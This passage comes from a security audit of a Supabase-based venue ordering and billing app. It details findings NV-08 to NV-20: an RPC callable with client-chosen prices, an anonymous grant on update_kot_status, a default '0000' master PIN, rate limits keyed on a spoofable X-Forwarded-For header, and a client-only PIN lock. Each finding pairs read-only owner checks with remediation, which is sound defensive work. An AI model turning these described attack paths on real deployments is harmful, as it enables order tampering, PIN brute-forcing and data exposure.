- **Owner check:** Owner only, read-only, with no request sent to the deployed app or its API and no venue, session, order or bill created. (1) In the Supabase SQL editor, run SELECT pg_get_functiondef('public.execute_atomic_bill_settlement(text,text,text,uuid,numeric,numeric,numeric,text,text,text,text,jsonb)'::regprocedure); and confirm the body matches migration 20261009000003_cashback_on_full_bill.sql: the ownership block runs only when request.jwt.claim.role is 'authenticated', and the session and order checks compare against p_business_id. (2) If the project records migrations in supabase_migrations.schema_migrations, run SELECT name FROM supabase_migrations.schema_migrations WHERE name LIKE '20261009%' and confirm 20261009000003 is applied. (3) In the hosting dashboard, confirm the production deployment's commit includes the current app/api/host/sessions/route.ts and lib/services/session/settle-session.service.ts, and that SUPABASE_SERVICE_ROLE_KEY is set for production without copying its value. If the deployed function differs from the migration or the deployed code differs from source, report that fact to the verifier; if all three match, the deployment blocker is resolved and only the local observation remains.
- **Remediation:** never reassign businessId from a looked-up row; add .eq('business_id', businessId) to the session-by-id, session-by-table_id and order-by-session_id lookups, clear resolvedTableId when the table check finds no row, and bind the RPC's session close, order update and checks to the caller's venue.

#### NV-08 [P1]: submit_guest_order_atomic is callable by any authenticated user for any venue with caller-chosen prices and totals

- **Fingerprint:** `qc/submit_guest_order_atomic/authenticated-no-tenant-binding`
- **Entry → sink:** `supabase/migrations/20261016000012_guest_delivery.sql:285` → `supabase/migrations/20261016000012_guest_delivery.sql:163`
- **What:** The final submit_guest_order_atomic (supabase/migrations/20261016000012_guest_delivery.sql:55-279) is SECURITY DEFINER (:76). It is revoked from PUBLIC and anon (:282-284) but granted to authenticated (:285-287). Its only input check is a null/blank test on p_business_id and p_table_number (:91-93). It never reads auth.uid() and never binds the caller to the venue. Any Supabase Auth user can call POST /rest/v1/rpc/submit_guest_order_atomic directly. That user can insert an orders row with caller-supplied subtotal, tax and grand_total (:163-183), order_items with caller-supplied prices (:188-199), and kitchen_tickets (:215-237) into any venue. Venue ids are public through the venues_public view (20261008000007:44-54, granted at 20261018000002:71). The direct call skips the controls in the legitimate path: catalogue pricing from catalog_items (submit-order.service.ts:74-75, :147-148), validateGuestAccess, the per-IP order rate limit, and the venue billing guard (app/api/guest/order/route.ts:60-80). With p_is_addon = true, the caller can also overwrite the items, subtotal, tax_amount, grand_total and total_amount of an existing order in any venue, given that order's id and business_id (:149-156). That UPDATE has no status filter. The order id is not secret: the unauthenticated GET /api/guest/order?cafe_id=<venue>&table=<table> returns the open order row, including its id (app/api/guest/order/route.ts:21-35; lib/services/guest-order/get-order.service.ts:27-35, :126). Anonymous guests can already place catalogue-priced orders through the app, so what this adds is price and total tampering, rewriting existing orders, and bypassing the route's guards. The trace holds in source. Two things remain to observe: a bounded run, and whether the deployed database's grant matches the migration (the GRANT block swallows errors at :288-289).
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / The deployed function ACL cannot be seen from source: the GRANT block at 20261016000012:281-290 swallows every error, so whether authenticated holds EXECUTE on the 17-argument signature in the deployed database is a deployment fact. Whether the live Auth project accepts public sign-up is also a deployment setting; source shows the app's own flows call auth.signUp (lib/guest/guest-account-client.ts:82; components/host/onboarding/create-host-account.ts:33), which suggests it is enabled but does not prove the live setting.
- **Owner check:** Owner, read-only, in the production database's SQL editor, with no request sent to the application: SELECT p.oid::regprocedure, p.proacl FROM pg_proc p WHERE p.proname = 'submit_guest_order_atomic'; and SELECT has_function_privilege('authenticated', 'public.submit_guest_order_atomic(uuid, text, uuid, boolean, jsonb, jsonb, numeric, numeric, numeric, text, text, text, text, text, jsonb, integer, jsonb)', 'EXECUTE'); Expected if vulnerable: the second query returns true. Also check in the Auth settings page whether email sign-up is enabled. Do not call the RPC or the /api/guest/order route against any deployment, and do not use production data. The local test is run only in the local Supabase described above.
- **Remediation:** REVOKE EXECUTE on the 17-argument signature FROM authenticated and grant it to service_role only, since the only caller is the server route using adminDb() (app/api/guest/order/route.ts:75, submit-order.service.ts:246); or recompute line prices and totals from catalog_items inside the function.

#### NV-09 [P1]: update_kot_status is anon-executable after the 20261006000004 blanket grant, allowing cross-venue KOT/order status changes

- **Fingerprint:** `qc/update_kot_status/service-role-lockdown-reopened-by-blanket-grant`
- **Entry → sink:** `supabase/migrations/20261006000004_database_merge_and_permissions_fix.sql:224` → `supabase/migrations/20261006000001_update_kot_status_rpc.sql:189`
- **What:** update_kot_status is a SECURITY DEFINER function (20261006000001:58-67) that was locked to service_role only (20261006000001:207-210). Migration 20261006000004:224 then runs GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO anon, authenticated, service_role, which covers this existing function, and :228 sets matching default privileges. No later migration or apply-pending script re-revokes update_kot_status or redefines it; a repo-wide grep finds no other REVOKE for it. The function takes only a ticket UUID, a target status and an optional staff id. It has no business_id, auth.uid() or caller check (:85-88). It runs the PENDING->PREPARING->READY->SERVED/CANCELLED state machine and writes kot_status_logs. If the ticket is linked to an order, it rewrites every order_items.kot_status for that order (:162-170) and the parent order status (:173-183, skipped only when the order is settled or closed). On SERVED it calls deduct_recipe_inventory_for_order (:189), whose auth.uid() IS NULL branch (20261010000007:149) admits anon, so the venue's recipe inventory is deducted. The ticket-id prerequisite is weaker than the hunter stated. The anonymous GET /api/guest/order (app/api/guest/order/route.ts:21-35) needs only a venue UUID and a table string. It uses adminDb, and get-order.service.ts:44/128 returns the latest kitchen ticket row via select('*') (active-ticket.util.ts:11), including its id. The ticket is returned only while the table has an open, unbilled order (get-order.service.ts:118). Any anonymous caller who can name a venue and a table with such an order therefore gets the live ticket UUID. Any authenticated Supabase user (for example a host of another venue) gets the same cross-venue reach through the authenticated grant. One correction: the host PATCH route app/api/host/kitchen/tickets/route.ts:131 calls this RPC with db = supabase || adminDb() (:64). For owner sessions supabase is the user-scoped client (lib/auth/guards.ts:162-243), so that call relies on the authenticated grant and falls back to a direct adminDb ticket update without the order cascade (:143-159); revoking authenticated therefore changes that product path. For staff PIN sessions supabase is adminDb() (lib/auth/guards.ts:136) and is unaffected. It is not true that revoking removes no product path.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether 20261006000004's GRANT lines ran on the hand-applied deployed database, and whether no out-of-repo REVOKE was applied afterwards, is not source-visible.
- **Owner check:** Owner runs read-only in the SQL editor: SELECT has_function_privilege('anon','public.update_kot_status(uuid,text,uuid)','EXECUTE') AS anon_exec, has_function_privilege('authenticated','public.update_kot_status(uuid,text,uuid)','EXECUTE') AS auth_exec; and SELECT proacl FROM pg_proc WHERE proname='update_kot_status';. Do not call the function against production data.
- **Remediation:** REVOKE ALL ON FUNCTION public.update_kot_status(uuid,text,uuid) FROM PUBLIC, anon, authenticated and GRANT EXECUTE TO service_role. Switch kitchen/tickets/route.ts:131 to adminDb().rpc after its existing venue-ownership check at :86-91, or add a p_business_id parameter bound to get_auth_business_ids(). Also drop the 20261006000004 ALTER DEFAULT PRIVILEGES function grant to anon and authenticated.

#### NV-10 [P2]: Legacy admin_pin DEFAULT '0000' still unlocks the master lock on venues that never set a PIN

- **Fingerprint:** `qc/businesses.admin_pin/legacy-default-0000-master-pin`
- **Entry → sink:** `app/api/host/staff/verify-pin/route.ts:15` → `lib/services/security/venue-pin.ts:39`
- **What:** Migration 20260922210000 added businesses.admin_pin with DEFAULT '0000'. In Postgres that fills the column on every row that already existed, and on every venue created before 20261005000002:92 dropped the default. Provisioning never writes admin_pin, and no migration clears the value afterwards. isPinSet (venue-pin.ts:28) counts any non-empty legacy admin_pin as a set master PIN, and /api/host/security/status (status/route.ts:17-22) reports isAdminPinActive=true. checkPin (venue-pin.ts:38-39) accepts the plain value with no pinProblem check, even though pin-rules.ts:6 would reject '0000' as a new PIN. The first correct entry calls upgradePin, which turns '0000' into a scrypt hash, so the value lasts. Correction to the hunter's claim: a staff PIN cookie session cannot reach this route. middleware.ts:61-64 lets staff through only for staffMayCall paths, and staff-roles.ts:42-58 does not list /api/host/staff/verify-pin or /api/host/security/pin. The lower-trust person is therefore someone using the owner's signed-in control center while it is master-locked, such as staff on a shared venue device. That person can type 0000 to get the 'Master Admin' unlock (verify-pin.service.ts:34-37). The unlock itself is client-side only (useControlCenterSecurity.ts:29-35 markUnlocked). Because setVenuePin (venue-pin.service.ts:33-35) accepts '0000' as the current master PIN, the same person can also replace the master or staff PIN through /api/host/security/pin. This bypasses a UI lock on a session that is already owner-authenticated. It does not cross tenants or bypass authentication. Exposure depends on live rows still holding '0000' or a hash derived from it. scripts/hash-legacy-venue-pins.mjs:35 also hashes any 4-digit plain PIN, '0000' included, so the default survives that migration too.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether any live businesses rows still hold admin_pin = '0000', or an admin_pin_hash derived from '0000', that the owner never chose is a database-state fact not visible in source.
- **Owner check:** The owner runs a read-only query against the production database: select count(*) filter (where admin_pin = '0000') as plain_default, count(*) filter (where admin_pin_hash is not null) as hashed from public.businesses. For hashed rows, check them offline with a trusted script, without writing, by running scrypt('0000', salt, 32) against each stored admin_pin_hash. Any match, or any plain '0000', confirms exposure. Make no updates during validation.
- **Remediation:** add a migration that sets admin_pin = NULL where admin_pin = '0000' and admin_pin_hash IS NULL; make checkPin/isPinSet and the legacy hashing script ignore legacy plain values that fail pinProblem; and have owners whose hash was derived from '0000' reset their PIN.

#### NV-11 [P2]: Guest PIN change/recovery only revokes the current venue; old PIN and other-venue sessions keep wallet access

- **Fingerprint:** `qc/guest-auth/pin-change-venue-scoped-revocation`
- **Entry → sink:** `app/api/guest/auth/pin/route.ts:12` → `lib/services/guest-auth/wallet-ownership.ts:50`
- **What:** A Vibers guest who has visited several venues has one guest_accounts row per venue (UNIQUE (business_id, handle)), each holding a copy of the same PIN hash carried over by connectVenue, and a separate guest_auth_sessions set per row. changeGuestPin and recoverGuestPin write the new PIN hash and delete sessions only for the current venue's row (id = account.id / account_id = account.id), although the doc comment promises that 'a stolen phone or an old session stops working'. After the victim changes or recovers a compromised PIN at venue A, an attacker who knew the old PIN can still sign in at any other venue B where the victim has a row (signIn verifies B's unchanged hash, then rebindWalletToDevice re-points the handle-global wallet claim to the attacker's device), or at an unvisited venue C if the oldest row (the pinFromOtherVenue reference) is not A. An attacker who already holds a session cookie issued at venue B keeps it: sessionHandle looks up the session by token hash with no business_id filter, and walletOwnership then treats the handle as owned and rebinds the claim to the attacker's wallet secret. Wallet impact is read access to balance/history and minting redemption codes against the handle's wallet, as reviewed in the wallet unit. Re-verification from source holds at every cited line; the only remaining step is the bounded local observation, which could not be run on this host.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run.
- **Owner check:** Owner-observed, on a staging project with dummy accounts only: create one Vibers user, connect at two dummy venues, sign in at venue B on browser 1, change the PIN at venue A on browser 2, then confirm on browser 1 that GET /api/guest/wallet still returns the wallet and that signing in at venue B with the old PIN succeeds. Do not use real guest accounts.
- **Remediation:** on PIN change/recovery update pin_hash/pin_salt (and reset lockout) on every guest_accounts row with the same user_id (or the same handle for legacy unlinked rows) and delete guest_auth_sessions for all of those account ids, ideally storing a single PIN per person.

#### NV-12 [P2]: Guest PIN lockout can be undercounted by concurrent guesses; the 'per handle' limit is keyed per IP+handle

- **Fingerprint:** `qc/guest-auth/pin-lockout-race-ip-keyed-handle-limit`
- **Entry → sink:** `app/api/guest/auth/login/route.ts:19` → `lib/services/guest-auth/guest-account.service.ts:207`
- **What:** An anonymous caller who knows a guest's @handle and a venue id can send wrong-PIN logins to POST /api/guest/auth/login. On a wrong PIN, signIn writes an absolute failed_attempts value computed from the row it read before the scrypt verify (guest-account.service.ts:186, 204-207). Nothing compares or increments atomically. So concurrent wrong guesses that all read the same counter each write the same next value, and a parallel batch can count as one failure instead of N against the 5-failure / 15-minute lockout. The same read-then-write pattern exists on the cross-venue reference row (vibers-pin-login.service.ts:32), in PIN change and recovery (guest-account.service.ts:334, 392) and in profile linking (vibers-profile.service.ts:38). The limiter the route calls 'per handle' (login/route.ts:28, 8 per 10 min) builds its key from scope, getClientIp(request) and the handle (rate-limiter.ts:283). getClientIp trusts the first X-Forwarded-For entry (rate-limiter.ts:40-44), so the limit is really per client IP plus handle. The per-address limit (30 per 10 min, line 24) is also keyed on IP plus venue. How cheaply an attacker escapes both limits depends on whether the deployed edge overwrites X-Forwarded-For and whether Upstash is configured; without Upstash the limits are per-instance memory. Each venue row with a PIN keeps its own lockout counter (vibers-pin-login.service.ts:17-18), so a person with rows at several venues gives an attacker several lockout budgets against the same PIN. A correct guess produces a guest session. walletOwnership accepts that session from any venue as proof of the handle's wallet and rebinds the wallet claim to the caller's device secret (wallet-ownership.ts:19-29, 46-51). Against a 10^6 PIN space, how much faster guessing becomes depends on achievable concurrency, the scrypt cost per request, and the deployed limiter and proxy behavior; none of these was observed.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether the deployed proxy (Vercel) overwrites client-supplied X-Forwarded-For, and whether Upstash Redis is configured (otherwise limits are per-instance memory), decides how cheaply the IP-keyed limits are escaped and how much real concurrency an attacker gets per handle.
- **Owner check:** The owner checks two things without sending attack traffic. First, whether the production edge replaces client-supplied X-Forwarded-For: log getClientIp for one request that carries a forged X-Forwarded-For header. Second, whether UPSTASH_REDIS_REST_URL/TOKEN and RATE_LIMIT_REQUIRE_REDIS=1 are set in the Vercel production environment.
- **Remediation:** count failures with an atomic SQL increment (for example an RPC doing UPDATE ... SET failed_attempts = failed_attempts + 1 ... RETURNING) and check the lock before verifying; key the per-handle limit on the handle alone; keep one lockout counter per person instead of one per venue copy of the PIN.

#### NV-13 [P2]: Anonymous event-interest submission with another guest's phone or email overwrites that guest's event lead and guest-ledger contact details

- **Fingerprint:** `qc/guest-event-interest/unverified-contact-merges-into-existing-guest-key`
- **Entry → sink:** `app/api/guest/events/interest/route.ts:41` → `supabase/migrations/20261016000009_event_gender_quotas.sql:51`
- **What:** POST /api/guest/events/interest is reachable without sign-in. It needs only a venue id and the id of a LIVE event, both of which the public event listing (GET /api/guest/events) exposes. For an anonymous caller, guestContact returns signedIn=false, so name, phone and email come straight from the request body (route.ts:42-45). resolveGuestKey then looks for any venue_guest_ledger row at that venue whose guest_key, phone or email matches the typed values (ledger.service.ts:23-27, 30). It returns the oldest match's guest_key, which can be a signed-in guest's h:@handle key, instead of a key built from the caller's own details. The route passes that key to record_event_interest with the attacker's name, email and party (route.ts:59-62). The SECURITY DEFINER RPC upserts on (event_id, guest_key) (migration 20261016000009:51-57). If the victim already has a lead for this event, the attacker can replace its guest_name, change its party size and male/female/other mix, and replace its email if they send one. A CONFIRMED status is kept, and a DECLINED lead goes back to INTERESTED. Even with no lead, the ledger upsert (lines 60-68) replaces the victim's ledger guest_name and email (if supplied), adds an event_leads count, and creates a lead under the victim's key. The response also tells the attacker the victim lead's resulting status (route.ts:80). Limits: the attacker must know the victim's 10-digit phone or exact email, plus a live event id; the RPC can be called only by service_role (20261016000007:138-139); and the route rate-limits each venue at 40 requests per minute. The phone itself does not change, because the phone used to match is the victim's own, and nothing is read back except the status. This was checked from source only.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / No local Postgres/Supabase is available to execute record_event_interest and observe the overwritten lead and ledger rows.
- **Owner check:** Owner-observed only, without sending attack traffic: confirm that the deployed database's record_event_interest definition matches 20261016000009 (pg_get_functiondef) and that the deployed /api/guest/events/interest is the route at ref 29027f4. If testing is wanted, use only a staging venue with a dummy guest whose phone the owner controls, following the local steps.
- **Remediation:** for unauthenticated callers, build the key only from the submitted details and never resolve it into existing ledger rows. In record_event_interest, never overwrite guest_name, email or party of an existing lead or ledger row from an unverified submission: make it insert-only, or create a separate unverified lead.

#### NV-14 [P2]: Anonymous guest order accepts non-catalog lines at price 0 with a client-chosen name and sends them to the kitchen

- **Fingerprint:** `qc/guest-order/uncatalogued-line-accepted-at-zero-price`
- **Entry → sink:** `app/api/guest/order/route.ts:50` → `supabase/migrations/20261016000012_guest_delivery.sql:188`
- **What:** POST /api/guest/order (anonymous; venue id plus table string, no QR secret) calls submitGuestOrder, which runs submitGuestOrderOnce. That function looks up catalog_items by business_id and the submitted ids. Lines are never required to match that lookup. A line with no id, a made-up id, or another venue's item id finds no catalog row. It skips the is_available check, which only looks at matched rows, and is still accepted with realPrice 0 and realName taken from the client's item.name or item.title. The quantity is clamped to 1..50. The line is sent to submit_guest_order_atomic, which inserts it into order_items (item_id is a free text column, price 0) and into the station kitchen ticket under the client's name, so the kitchen sees an ordinary dish. Because the price is 0, the bill total does not include it. An anonymous caller can therefore put free, arbitrarily named dishes (for example a real menu name) on any table's KOT and bill. The legitimate guest client always sends catalog ids, and the host add-items path rejects any non-uuid item, which shows the intended rule. Not yet observed, but plausible from source: catalogRes.error is never checked, so if one non-uuid id makes the uuid IN filter fail, catalogMap is empty and every line in that order, real dishes included, would be priced 0.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run.
- **Owner check:** Owner-run, read-only, on a deployed copy the owner controls. No request is sent to the deployment and no order is placed, edited or voided. In that database run: SELECT pg_get_functiondef(p.oid) FROM pg_proc p WHERE p.proname = 'submit_guest_order_atomic'; and SELECT tgname FROM pg_trigger WHERE tgrelid = 'public.order_items'::regclass AND NOT tgisinternal; The record holds if the function body inserts order_items from p_order_items with no lookup against catalog_items, and the trigger query returns no rows. Report both results.
- **Remediation:** reject the order with 400 when any line's id is missing or not in catalogMap for the venue, check catalogRes.error, and always take the line name from the catalog row, never from the client.

#### NV-15 [P2]: Master-PIN section lock is enforced only by a client sessionStorage flag

- **Fingerprint:** `qc/host-master-pin/client-only-unlock-state`
- **Entry → sink:** `components/host/modals/AdminGatekeeperModal.tsx:49` → `app/api/host/profile/update/route.ts:15`
- **What:** The control center locks profile/banking, wallet and payments behind the venue master PIN (ALWAYS_LOCKED), so that staff using the owner's signed-in terminal cannot change bank details or settle dues. The server checks the PIN in POST /api/host/staff/verify-pin but never records that the session is unlocked. The unlock lives only in sessionStorage 'master_admin_unlocked' and React state. Protected APIs check only requireHost. For example, POST /api/host/profile/update saves bank account, IFSC, UPI id and the protected_modules lock map. Anyone at that signed-in terminal can set the flag in devtools or call the API directly, change the venue's UPI or bank details, and turn off the optional (non-ALWAYS_LOCKED) section locks. Changing the master PIN itself is not affected, because /api/host/security/pin separately requires currentPin on the server. A repo-wide search found no other server route that checks the master PIN. This is a shared-device control inside a single owner session, so impact depends on venues really handing the owner-signed-in control center to staff.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether venues actually hand the owner-signed-in control center to staff (rather than the separate /pos staff-PIN terminals) is an operational fact. The in-code comments say they do.
- **Owner check:** The owner confirms whether staff operate the owner-signed-in control center in practice, and whether any edge, gateway or API layer outside this repository enforces the master-PIN lock on /api/host/profile/update and the wallet/payment routes. Do not modify live banking details to test this.
- **Remediation:** on a successful master-PIN verify, issue a short-lived HttpOnly signed 'pin-unlocked' cookie bound to the user and business, require it in the server guards for ALWAYS_LOCKED modules (profile/update, wallet and payment routes), and stop treating the sessionStorage flag as authority.

#### NV-16 [P2]: Kitchen PATCH falls back to an unchecked service-role status write when update_kot_status rejects a transition, with a client-chosen staff_id

- **Fingerprint:** `qc/kitchen-ticket/patch-fallback-bypasses-kot-state-machine`
- **Entry → sink:** `app/api/host/kitchen/tickets/route.ts:67` → `app/api/host/kitchen/tickets/route.ts:149`
- **What:** PATCH /api/host/kitchen/tickets calls update_kot_status and, on any rpcError (app/api/host/kitchen/tickets/route.ts:143), writes status.toUpperCase() directly to kitchen_tickets via adminDb() scoped only by id and business_id (route.ts:149-159). For staff PIN sessions (WAITER, CHEF, CASHIER may PATCH this prefix per lib/services/staff-auth/staff-roles.ts:40-57), requireHost returns the service-role client (lib/auth/guards.ts:136), so the RPC runs and its own 'Invalid KOT status transition' exception (migration :119-124) is exactly what triggers the fallback. A same-venue staff member can therefore move terminal SERVED/CANCELLED tickets back to PENDING/PREPARING/READY or make any skip; the only DB bound is the kitchen_tickets CHECK limiting values to the five statuses (20260921201500_create_kitchen_tickets.sql:9). The fallback skips the kot_status_logs insert, the order_items/orders sync and the SERVED inventory deduction, so the ticket diverges from order state. staff_id is taken from the request body on both the RPC path and the fallback (route.ts:126), so the actor recorded in status_history and kot_status_logs.changed_by can be forged; the sibling line route derives it from the session (app/api/host/tables/lines/route.ts:23). Correction to hunter wording: for owners, the authenticated EXECUTE revoke (migration :209) is likely re-opened by the later blanket GRANT EXECUTE ON ALL FUNCTIONS (20261006000004_database_merge_and_permissions_fix.sql:224), so owner calls also reach the RPC and fall back mainly on transition errors; whether the deployed grant state matches is unverified. Impact is same-tenant ticket-state and audit integrity, not cross-tenant: void_pending_order_line keys on order_items.kot_status, which the fallback does not change, so the reopen does not chain into voiding started lines.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run.
- **Owner check:** Owner, in a non-production project: run SELECT has_function_privilege('authenticated','public.update_kot_status(uuid,text,uuid)','EXECUTE'); then, signed in as a test CHEF staff of a test venue, PATCH a test ticket already SERVED to status 'PREPARING' and read back kitchen_tickets.status and kot_status_logs for that ticket; expected vulnerable result is status PREPARING with no new kot_status_logs row. Restore the test ticket afterwards.
- **Remediation:** remove the direct-write fallback and return the RPC error (as lib/services/kitchen/update-ticket.service.ts:46-48 does), and derive staff_id only from auth.staff/auth.user.

#### NV-17 [P2]: Rate-limit client address taken from the client-supplied X-Forwarded-For header

- **Fingerprint:** `qc/rate-limiter/getClientIp-trusts-client-x-forwarded-for`
- **Entry → sink:** `app/api/host/staff/verify-pin/route.ts:19` → `app/api/host/staff/verify-pin/route.ts:39`
- **What:** getClientIp (lib/middleware/rate-limiter.ts:40-51) returns the leftmost X-Forwarded-For entry, falling back to X-Real-IP and then CF-Connecting-IP. It has no trusted-proxy check. Every IP-keyed security limit uses that value as part of its bucket key. That includes the venue master/staff PIN failure limit (5 per 15 minutes per IP and venue) on POST /api/host/staff/verify-pin and POST /api/host/security/pin, and the guest order spam cap (/api/guest/order:66). It also includes every enforceRateLimit caller, because the key at :283 is scope:ip:subject. One of those callers is the per-handle guest PIN login limit (/api/guest/auth/login:28): its key also contains the IP, so it is per-IP-and-handle, not per-handle. Others are the per-IP Vibey gates and the staff_pin_login limit. Unless the edge replaces the header, a client that rotates X-Forwarded-For gets a fresh bucket on every request. Impact needs to be stated carefully. verify-pin and security/pin require an owner session; staff roles cannot call them under staff-roles.ts. The verify-pin result is only a JSON success that the client-side AdminGatekeeperModal uses, so the master PIN is a UI gate on an already-authenticated owner terminal and not a server-side authorization. Brute-forcing it (10,000 4-digit values) lets someone at a signed-in owner terminal learn the venue PIN, then change or remove it through security/pin. Controls that rotation does not bypass: the staff PIN login's atomic per-staff lockout, and the guest account's own lockout (non-atomic). Those still bound PIN guessing on those paths. On Vercel, the edge is documented to overwrite X-Forwarded-For, which would neutralize this. vercel.json shows a Vercel build, but whether production is reachable only through that edge is not visible in the repo.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / Whether the production and preview edge overwrites client-supplied X-Forwarded-For (and X-Real-IP / CF-Connecting-IP) is a hosting fact not visible in the repo. vercel.json indicates Vercel, which documents overwriting X-Forwarded-For with the connecting client IP; that would neutralize the bypass there. Any origin reached without that edge (self-hosted next start, another proxy that appends rather than replaces) would trust the client value.
- **Owner check:** Owner-observed and non-destructive. For the production and preview domains, confirm that traffic reaches the app only through Vercel's edge and that no self-hosted next start, container or alternative proxy origin is exposed. Then, from one client, send a single GET to a harmless route such as /api/health with the header X-Forwarded-For: 203.0.113.7. In Vercel request logs (or a temporary log line of request.headers.get('x-forwarded-for') and x-vercel-forwarded-for in a preview deployment), check whether the app saw 203.0.113.7 or the real client IP. If the app saw 203.0.113.7, the bypass is live. Do not send PIN guesses against a real venue.
- **Remediation:** derive the client IP from a platform-trusted source (on Vercel, x-vercel-forwarded-for / x-real-ip set by the edge, or the rightmost XFF hop added by trusted ingress) behind an explicit TRUSTED_PROXY setting and ignore client XFF otherwise; also add a per-venue (IP-independent) cap on venue-PIN failures and a per-handle (IP-independent) guest login limit.

#### NV-18 [P2]: Staff PIN reset does not revoke existing staff sessions

- **Fingerprint:** `qc/staff-session/no-credential-version-revocation`
- **Entry → sink:** `app/api/auth/staff-pin/route.ts:58` → `lib/auth/guards.ts:159`
- **What:** Someone who learns a staff member's 4-digit PIN and signs in via POST /api/auth/staff-pin receives a qc_staff_session token valid for 12 hours. The signed payload is only {sid,bid,role,name,exp}, and the per-request revalidation (staffStillValid, cached 10s in lib/auth/staff-access.ts) checks only that the row is active, not INACTIVE, has some non-null pin_hash, and has the same role. When the owner resets the PIN with PUT /api/host/staff/access, only pin_hash and the lock fields change, so the old token keeps passing requireHost for that role's allowlist (for CASHIER this includes /api/host/wallet/redeem GET/POST/PATCH, /api/host/wallet/guest GET, /api/host/orders/create POST and the Vibey co-pilot) until it expires. The same applies to toggling active off and back on, or changing the role away and back: the old token works again once the row matches. Logout (DELETE /api/auth/staff-pin) only clears the browser cookie. Removing the staff member (DELETE /api/host/staff/access) does revoke it, because that nulls pin_hash and sets INACTIVE, and re-adding creates a new id. Impact is limited to the venue and to the staff role's allowlist.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run.
- **Remediation:** add a staff_profiles.session_version (or pin_changed_at) column, sign it into the token at login, bump it in PUT /api/host/staff/access whenever pin, role or active changes, and make staffStillValid require it to match.

#### NV-19 [P2]: Cancelling one KOT ticket voids every line of the table's order, letting a waiter free a table with served food unpaid

- **Fingerprint:** `qc/update_kot_status/order-wide-item-sync-voids-started-lines`
- **Entry → sink:** `app/api/host/kitchen/tickets/route.ts:59` → `lib/services/session/release-table.service.ts:45`
- **What:** Guest add-on rounds reuse the table's open order id (orders with status 'served' are not in CLOSED_STATUSES, so they remain the active order), and submit_guest_order_atomic inserts each round's kitchen_tickets with that same order_id; multi-station rounds also produce several tickets per order_id. update_kot_status, however, applies a single ticket's transition to every order_items row WHERE order_id = v_ticket.order_id and to the parent order. A PIN-signed-in WAITER, who may PATCH /api/host/kitchen/tickets and is served by the service-role client so the RPC runs, can send status 'CANCELLED' for any non-terminal (PENDING/PREPARING/READY) ticket of the order, such as a fresh add-on round. Every line, including lines already 'served', becomes kot_status 'cancelled' and the order becomes 'cancelled'. The waiter can then call PATCH /api/host/sessions with action 'release' (allowed for WAITER): releaseTable finds no open order, because 'cancelled' is a closed status, and sees no started line, because 'cancelled' counts as not started. It closes the session and sets the table VACANT with no settlement. This defeats the rule that started lines cannot be voided (void_pending_order_line raises LINE_STARTED) and must be settled by the cashier. Source review confirms the trace. Two facts remain open: the actual runtime result (no sandbox was available to observe it), and whether the deployed database still uses this function body. No later migration in the repository redefines it, and no trigger was found on order_items or orders that would block the change.
- **Blockers:** No OS-enforced sandbox (network-isolated, empty-env, read-only target, resource-limited) is available on the audit host, so the bounded local observation could not be run. / It must be confirmed that the deployed database still runs the 20261006000001 body of update_kot_status. No later redefinition exists in the repository. It must also be confirmed that the deployed orders and order_items tables have no trigger or CHECK constraint that rejects lowercase 'cancelled' or a served-to-cancelled change. No such trigger or constraint is visible in the repository migrations.
- **Owner check:** Owner (read-only): run select pg_get_functiondef('public.update_kot_status(uuid,text,uuid)'::regprocedure) on the production database and confirm the order_items UPDATE uses WHERE order_id = v_ticket.order_id. Then run select tgname, tgrelid::regclass from pg_trigger where tgrelid in ('public.order_items'::regclass,'public.orders'::regclass) and not tgisinternal, and select conname, pg_get_constraintdef(oid) from pg_constraint where conrelid in ('public.order_items'::regclass,'public.orders'::regclass) and contype='c'. Confirm that nothing blocks setting served lines and the order to 'cancelled'. Do not run any write against production.
- **Remediation:** in update_kot_status sync only the order_items that belong to this ticket (store kitchen_ticket_id on order_items, or match the ticket's own lines), never change orders.status because one ticket was cancelled, and refuse CANCELLED from staff when any line on the ticket is past pending.

#### NV-20 [P2]: CASHIER staff can read P&L, dues, guest and booking data through the Vibey co-pilot beyond their role allowlist

- **Fingerprint:** `qc/vibey-host/cashier-copilot-bypasses-staff-role-allowlist`
- **Entry → sink:** `lib/services/staff-auth/staff-roles.ts:56` → `lib/vibey/host/tools-money.ts:32`
- **What:** A CASHIER staff session is allowed GET/POST /api/host/vibey by staffMayCall (staff-roles.ts:56), and requireHost hands the route the service-role client for staff (guards.ts:136). The co-pilot never rechecks the staff role. Its only per-tool restriction is the owner's master-PIN lock list: the gate node filters calls by TOOLS[name].module against that list (graph.ts:62). When no admin PIN is set, lockedModules returns [] (locks.ts:9), so a cashier at a venue with the host Vibey flag on gets every tool: sales, profit and loss, platform dues (dues/fees), and top guests with names, spend and visit counts. This works even without a model, because the keyword router (router.ts:8-15) maps words like 'profit', 'dues', 'guests', 'reservations' and 'deliveries' straight to tools. When a PIN is set, the dashboard, payments and guests modules are locked by default. But the deliveries ('delivery') and reservations ('reservations') tools use module keys that are not in DEFAULT_LOCKS, and readLocks drops unknown keys. So a cashier can always read delivery customer names and totals, and reservation guest names. The cashier allowlist has no /api/host/analytics, /api/host/delivery or /api/host/reservations rule, so the cashier cannot fetch any of this directly. Design docs (docs/VIBEY_AGENT_PLAN.md §5.4, staff-roles.ts:55) say the lock list is the intended gate for the cashier co-pilot. Whether a no-PIN cashier is meant to see money and guest data is an owner 